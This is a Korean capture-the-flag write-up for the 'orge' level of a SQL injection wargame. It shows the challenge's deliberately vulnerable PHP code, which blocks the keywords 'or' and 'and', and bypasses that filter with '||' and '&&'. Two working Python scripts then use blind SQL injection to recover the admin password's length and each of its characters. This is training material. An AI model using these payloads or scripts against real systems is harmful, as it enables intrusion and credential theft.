# orge

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- `or`, `and`를 필터링 한다.
- solve 함수를 실행시키려면, 정확한 admin pw를 알아야 한다.
&rarr; `blind-sqlinjection` 을 활용하여 구한다.

## 3. Solution
<a href="./../orc/orc.md"> `문제:orc` </a>와 마찬가지로 총 두 번의 sqli를 진행할 것이다.
추가된 점이라면, `or`과 `and`의 우회가 들어갔다.
1. pw의 길이
2. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`pw` | 1234' || id='admin' && length(pw)=i #


우선, `length` 함수를 이용하여 길이를 구할것이다.

`&&`와 `#`은 url encoding을 하여 각각 `%26%26`, `%23`로 보내준다.
이는 URL을 해석하는 과정에서 다른 기능과 겹치지 않기 위함이다.
실제로 `&`은 파라미터 객체를 나누는 기준, `#`은 URL에서 anchor의 역할을 한다.


이후, 비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?\
            pw=1234' || id='admin' %%26%%26 length(pw)=%d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`pw` | 1234' || id='admin' && ascii(substr(pw,i,1))=j #


a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?\
            pw=1234' || id='admin' %%26%%26 length(pw)=%d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?\
                pw=1234' || id='admin' %%26%%26 ascii(substr(pw,%d,1))=%d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : 7
pw(2) : 7b
pw(3) : 7b7
pw(4) : 7b75
pw(5) : 7b751
pw(6) : 7b751a
pw(7) : 7b751ae
pw(8) : 7b751aec
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | 7b751aec